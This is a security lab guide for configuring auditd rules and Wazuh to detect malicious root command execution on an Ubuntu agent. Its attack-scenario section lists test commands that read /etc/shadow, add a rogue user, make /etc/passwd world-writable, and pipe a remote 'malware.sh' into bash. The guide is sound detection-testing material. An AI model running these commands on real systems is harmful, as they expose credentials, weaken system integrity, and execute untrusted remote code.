# Detecting Malicious Command Execution Using Auditd

## Objective
Detect suspicious and potentially malicious command execution on the Ubuntu agent using Auditd and analyze the resulting alerts in the Wazuh Dashboard.

---

## Overview

Auditd provides detailed visibility into command execution and privileged actions performed on Linux systems. By monitoring `execve` system calls and sensitive file access, Wazuh can detect activities associated with privilege escalation, persistence, and defense evasion.

In this use case, commands executed with elevated privileges are captured by Auditd, forwarded by the Wazuh agent, and analyzed by the Wazuh Manager.

---

## Configuration 

First install auditd by following the steps in [auditd.md](../Installation/Auditd.md). Once installation is complete we need to configure the rules and specify the rule file audit need to use. Two ways to do it,
1. use Default file 
``` 
sudo auditctl -R /etc/audit/audit.rules
```
2. use custom file 
- create a custom file in "/etc/audit/rules.d/" 
- then restart the service 
```
sudo auditctl -R /etc/audit/rules.d/custom.rules
```
---
### Rule creation 
For this lab we are using custom rules file to monitore all the commands executed in as "root"

1. Agent VM
    - create custom file "/etc/audit/rules.d/custom.rules"
    ```
    -a always,exit -F arch=b64 -S execve -S execveat -F euid=0 -k audit-wazuh-c
    -a always,exit -F arch=b32 -S execve -S execveat -F euid=0 -k audit-wazuh-c
    ```
    - add audtid log file to ossec.conf. The log file used here is at "/var/log/audit/audit.log"
    ```
    <localfile>
        <log_format>audit</log_format>
        <location>/var/log/audit/audit.log</location>
    </localfile>
    ```
    - restart auditd and wazuh-agent
    ```
    sudo auditctl -R /etc/audit/rules.d/custom.rules
    sudo systemctl restart wazuh-agent
    ```


## Attack Scenario

The following suspicious commands are executed on the Ubuntu agent as root:

- Reading sensitive files (`/etc/shadow`)
- Creating new users
- Modifying file permissions
- Downloading remote scripts
```
sudo cat /etc/shadow
sudo useradd attacker
sudo chmod 777 /etc/passwd
curl http://example.com/malware.sh | bash
```

2. Wazuh dashboard
    - Login into wazuh dashboard 
    - under agent -> Security events, you will find all the above commands alerts mapped to rule_id, mitre attack TTPs and other details.

    - Reference Image:
        - [auditd events](../images/auditd%20evetns.png)
        